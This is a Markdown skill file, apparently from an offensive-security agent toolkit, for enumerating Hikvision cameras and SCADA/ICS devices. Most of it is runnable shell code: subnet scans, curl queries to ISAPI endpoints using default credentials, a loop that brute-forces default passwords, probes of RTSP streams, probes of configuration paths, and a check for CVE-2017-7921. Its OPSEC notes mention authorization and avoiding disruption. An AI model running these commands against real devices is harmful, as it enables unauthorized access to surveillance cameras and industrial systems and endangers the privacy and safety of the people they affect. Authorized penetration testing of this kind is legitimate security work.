---
name: scada-hikvision
description: SCADA/Hikvision ISAPI camera enumeration and default creds
version: 1.0.0
phase: recon
category: enumeration
tags: [scada, hikvision, isapi, camera, iot, default-creds]
tools: [curl, nmap]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - origin-ip-discovery
mitre_attack:
  - T1190
  - T1133
---

## When to Use

- Target has Hikvision cameras or SCADA/ICS systems
- Enumerate camera feeds via ISAPI
- Hunting for default credentials on IoT/SCADA devices
- Identifying exposed RTSP streams

## Prerequisites

- curl and nmap installed
- Network access to target subnet
- Understanding of Hikvision ISAPI endpoints

## Procedure

### 1. Hikvision Device Discovery

```bash
nmap -sV -p 80,443,8000,8443,554,37777 TARGET_SUBNET/24 --open
nmap -p 80,443,8000,8443 TARGET_SUBNET/24 --script hikvision-info
```

### 2. ISAPI Endpoint Enumeration

```bash
curl -s -u admin:admin "https://TARGET/ISAPI/System/deviceInfo" 2>/dev/null
curl -s -u admin:12345 "https://TARGET/ISAPI/System/deviceInfo" 2>/dev/null
curl -s -u admin:admin "https://TARGET/ISAPI/System/time" 2>/dev/null
curl -s -u admin:admin "https://TARGET/ISAPI/System/Network/interfaces" 2>/dev/null
```

### 3. Camera Channel Enumeration

```bash
curl -s -u admin:admin "https://TARGET/ISAPI/ContentMgmt/record/tracks" 2>/dev/null
curl -s -u admin:admin "https://TARGET/ISAPI/Streaming/channels" 2>/dev/null
curl -s -u admin:admin "https://TARGET/ISAPI/PTZCtrl/channels" 2>/dev/null
```

### 4. Default Credential Testing

```bash
for cred in "admin:admin" "admin:12345" "admin:123456" "admin:password" \
  "admin:Hik12345" "admin:1234" "admin:888888"; do
  USER=$(echo $cred | cut -d: -f1)
  PASS=$(echo $cred | cut -d: -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -u "$USER:$PASS" \
    "https://TARGET/ISAPI/System/deviceInfo")
  [ "$STATUS" = "200" ] && echo "SUCCESS: $USER:$PASS"
done
```

### 5. RTSP Stream Discovery

```bash
for channel in 1 2 3 4; do
  timeout 3 ffprobe \
    "rtsp://admin:admin@TARGET:554/Streaming/Channels/${channel}01" 2>&1 \
    | grep -i "stream\|video"
done
```

### 6. Configuration File Access

```bash
for path in "/System/configuration" "/ISAPI/Security/sessionLogin/capability" \
  "/doc/serverlist.xml" "/sdk/webContent/overview/deviceinfo.xml"; do
  STATUS=$(curl -sI "https://TARGET$path" -o /dev/null -w "%{http_code}")
  [ "$STATUS" = "200" ] && echo "CONFIG: $path"
done
```

### 7. Firmware and CVE Check

```bash
curl -s -u admin:admin "https://TARGET/ISAPI/System/deviceInfo" | \
  grep -oP '<firmwareVersion>[^<]+</firmwareVersion>'
nmap -p 80,443 --script http-vuln-cve2017-7921 TARGET
```

## OPSEC Rules

- SCADA/ICS systems are CRITICAL — do NOT disrupt operations
- Do NOT modify camera settings during recon
- Document findings but do not access camera feeds without authorization
- Report critical findings to engagement lead IMMEDIATELY

## Verification

```bash
curl -s "https://TARGET/" | grep -i "hikvision"
curl -sI "https://TARGET/" | grep -i "server: hikvision"
```

## Pitfalls

- CVE-2017-7921 allows unauthenticated access to some endpoints
- Some devices require Digest authentication, not Basic
- ISAPI may be disabled on newer firmware
- Default credentials may be changed but weak (e.g., admin123)

## Output Format

```json
{
  "target": "TARGET",
  "device_type": "Hikvision DS-2CD2xxx",
  "firmware_version": "V5.5.100",
  "default_creds_found": true,
  "credentials": {"username": "admin", "password": "admin"},
  "camera_channels": 4,
  "rtsp_accessible": true,
  "severity": "critical"
}
```
